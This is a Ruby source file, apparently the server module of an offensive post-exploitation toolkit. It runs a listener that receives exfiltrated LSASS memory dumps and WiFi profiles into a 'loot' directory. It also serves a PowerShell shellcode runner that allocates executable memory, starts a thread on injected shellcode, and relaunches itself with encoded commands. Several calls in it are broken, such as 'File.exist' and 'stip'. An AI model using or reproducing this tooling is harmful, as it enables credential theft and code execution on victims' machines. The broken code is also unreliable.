#!/usr/bin/env ruby
require 'socket'
require 'openssl'
require 'core'
require 'uri'
include Core::Commands
module Server
  class Setup
    include Core::Files
    def ssl(host, port)
      tcp_server = TCPServer.new(host, port)
      ctx = OpenSSL::SSL::SSLContext.new
      ctx.cert = OpenSSL::X509::Certificate.new(
        File.open("#{cert_dir}server.crt"))
      ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
      server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
      server
    end

    def use_ssl?
      ssl = rgets('Use ssl? [t/f]: ',  't')
      ssl.downcase[0] == 't' ? true : false
    end

    def host
      host_name = rgets('Enter the host ip/url to listen on: ', 'localhost')
      print_success("Using #{host_name} as server")
      host_name
    end

    def port
      port = rgets('Enter the port you would like to use[443]: ', 443)
      until (1..65_535).cover?(port.to_i)
        print_error('Not a valid port')
        sleep(1)
      end
      print_success("Using #{port}")
      port
    end

    def host_payload?
      choice = ''
      until choice.downcase[0] == 'y' || choice.downcase[0] == 'n'
        choice = rgets('Host payload? [y/n]: ', 'y')
      end
      choice.downcase[0] == 'y' ? true : false
    end

    def host_listener?
      choice = ''
      until choice.downcase[0] == 'y' || choice.downcase[0] == 'n'
        choice = rgets('Host listener? [y/n]: ', 'y')
      end
      choice.downcase[0] == 'y' ? true : false
    end
  end

  class Start
    include Core::Files
    def initialize(ssl, host, port)
      Dir.mkdir(loot_dir) unless Dir.exist?(loot_dir)
      if ssl
        print_info("Starting SSL Server!\n")
        @server = Server::Setup.new.ssl(host, port.to_i)
      else
        print_info("Starting Server!\n")
        @server = TCPServer.open(port.to_i)
      end
    end

    def listener(type)
      loop do
        Thread.start(@server.accept) do |client|
          print_info("Client Connected.\n")
          file_name = client.gets
          file_name = _clean_name(file_name)
          print_success("Got #{file_name} file!\n")
          print_info("Getting Data\n")
          out_put = client.gets
          print_info("Writing to File\n")
          case type
          when 'lsass'
            file_name = "#{file_name}_#{_timestamp}.dmp"
          when 'wifi'
            file_name = "#{file_name}_#{_timestamp}.xml"
          else
            file_name = "#{file_name}_#{_timestamp}"
          end
          File.open("#{loot_dir}#{file_name}", 'w') do |f|
            f.write(Base64.decode64(out_put))
          end
          print_success("File Done!\n")
          client.close
        end
      end
    rescue => error
      print_error(error)
    end

    def host_file
      time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
      loop do
        Thread.start(@server.accept) do |client|
          request = client.gets
          request_uri = request.split(' ')[1]
          path = URI.unescape(URI(request_uri).path)
          if File.exist(path) && !File.directory?(path)
            File.open(path) do |f|
              headers = ['HTTP/1.1 200 OK',
                         "Date: #{time}",
                         'Server: Ruby',
                         'Content-Type: applicaiton/octet-stream; charset=iso-8859-1',
                         "Content-Length: #{f.size}\r\n\r\n"].join("\r\n")
              client.print headers
              IO.copy_stream(f, client)
            end
          else
            message = "File not found\n"
            headers = ['HTTP/1.1 404 Not Found',
                       "Date: #{time}",
                       'Server: Ruby',
                       'Content-Type: text/plain; charset=iso-8859-1',
                       "Content-Length: #{message.size}\r\n\r\n"].join("\r\n")
            client.print headers
            client.print message
          end
          client.close
        end
      end
    end

    def host_raw(shellcode)
      time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
      s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
      s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
      s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
      s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
      s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
      s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
      s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
      s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
      s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
      s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
      s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
      s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
      s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
      s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
      s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
      s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop )
      s << %(-noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";)
      s << %(iex "& powershell $cmd $gq";})
      loop do
        begin
          Thread.start(@server.accept) do |client|
            print_info("Client Connected!\n")
            headers = ['HTTP/1.1 200 OK',
                       "Date: #{time}",
                       'Server: Ruby',
                       'Content-Type: text/html; charset=iso-8859-1',
                       "Content-Length: #{s.length}\r\n\r\n"].join("\r\n")
            client.print headers
            client.print "#{s}\n"
            client.close
          end
        rescue => e
          puts e
        end
      end
    end
    trap('INT') do
      print_info('Caught CTRL-C stopping server!')
      exit
    end
  end

  private

  def _timestamp
    Time.now.strftime('%Y_%m_%d_%H_%M_%S')
  end

  def _clean_name(name)
    name.stip
  end
end
